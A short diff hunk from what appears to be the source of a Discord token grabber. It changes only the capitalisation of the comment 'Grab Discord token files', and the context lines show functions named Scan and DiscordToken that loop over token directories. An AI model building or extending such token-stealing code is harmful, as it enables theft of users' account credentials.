@@ -32,7 +32,7 @@ def Scan(Directory):
 	return Tokens
 
 
-# Grab discord token files
+# Grab Discord token files
 
 def DiscordToken():
 	for Discord, Directory in Directories.items():
